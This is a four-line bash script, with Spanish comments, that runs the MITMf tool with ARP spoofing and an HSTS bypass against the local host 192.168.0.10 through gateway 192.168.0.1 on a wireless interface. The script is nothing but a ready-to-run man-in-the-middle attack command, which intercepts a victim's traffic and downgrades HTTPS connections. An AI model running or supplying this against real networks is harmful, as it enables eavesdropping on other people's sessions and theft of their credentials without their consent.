#!/bin/bash
#editar config
#nano /etc/mitmf/mitmf.conf
mitmf --hsts --arp --spoof -i wlan0 --target 192.168.0.10 --gateway 192.168.0.1;
